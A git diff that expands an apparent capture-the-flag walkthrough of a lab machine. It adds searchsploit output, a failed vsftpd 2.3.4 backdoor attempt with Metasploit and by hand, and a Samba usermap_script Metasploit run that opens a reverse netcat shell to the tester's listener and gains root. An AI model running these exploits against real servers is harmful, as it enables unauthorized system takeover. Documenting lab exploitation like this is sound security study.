@@ -86,7 +86,44 @@ Unfortunately we only get anonymous read access.
 Doing `nc 10.10.10.3 21` also confirms it is running `vsFTPd v2.3.4`.
 
 `searchsploit vsftpd 2.3.4` shows `Backdoor Command Execution`.
+```
+hippoeug@kali:~$ searchsploit vsftpd 2.3.4
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                      |  Path
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                              | unix/remote/17491.rb
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+```
+
+We also try metasploit modules.
+```
+hippoeug@kali:~$ msfconsole
+...
+msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
+[*] No payload configured, defaulting to cmd/unix/interact
+...
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
+
+[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 10.10.10.3:21 - USER: 331 Please specify the password.
+[*] Exploit completed, but no session was created.
+```
 However, metasploit attacks etc didn't work.
+
+We also try the backdoor manually, but yielded no results.
+```
+hippoeug@kali:~$ ftp 10.10.10.3
+Connected to 10.10.10.3.
+220 (vsFTPd 2.3.4)
+Name (10.10.10.3:hippoeug): 123456:)
+331 Please specify the password.
+Password:
+^C
+421 Service not available, remote server has closed connection
+hippoeug@kali:~$ nc -vn 10.10.10.3 6200
+```
+We were expecting `(UNKNOWN) [192.168.1.142] 6200 (?) open` but it did not appear.
 
 Sources:
 - https://www.hackingtutorials.org/metasploit-tutorials/exploiting-vsftpd-metasploitable/
@@ -163,5 +200,16 @@ Shellcodes: No Results
 There are a few interesting choices, but we are going for `Username map script Command Execution` Metasploit module.
 Researching it, we find https://securitytrails.com/blog/nmap-vulnerability-scan.
 Let's run the metasploit script `use exploit/multi/samba/usermap_script`.
+```
+hippoeug@kali:~$ msfconsole
+...
+msf5 > use exploit/multi/samba/usermap_script
+[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+...
+msf5 exploit(multi/samba/usermap_script) > run
 
-Boom, we got root access and found the flags!
+[*] Started reverse TCP handler on 10.10.14.16:4444 
+[*] Command shell session 1 opened (10.10.14.16:4444 -> 10.10.10.3:44602) at 2021-01-02 22:39:18 +0800
+```
+
+Boom, we got root access (verified with whoami) and found the flags! They're in `/root`& `/home/makis`.
